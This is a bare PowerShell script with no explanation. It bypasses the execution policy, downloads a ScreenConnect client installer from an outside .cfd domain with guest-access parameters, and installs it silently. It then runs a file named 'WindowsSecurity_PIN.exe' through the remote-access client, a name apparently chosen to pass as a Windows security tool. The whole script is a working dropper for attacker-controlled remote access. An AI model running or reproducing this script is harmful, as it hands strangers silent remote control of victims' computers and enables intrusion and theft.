Set-ExecutionPolicy Bypass -Scope Process -Force
$InstallerURL = "https://trews.cfd/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$DownloadPath = "C:\Windows\Temp\ClientSetup.msi"
Invoke-WebRequest -Uri $InstallerURL -OutFile $DownloadPath
msiexec.exe /i C:\Windows\Temp\ClientSetup.msi /qn
& "C:\Program Files (x86)\ScreenConnect Client\ScreenConnect.WindowsClient.exe" "RunFile" "C:\Users\operator\Documents\ScreenConnect\Temp\WindowsSecurity_PIN.exe"
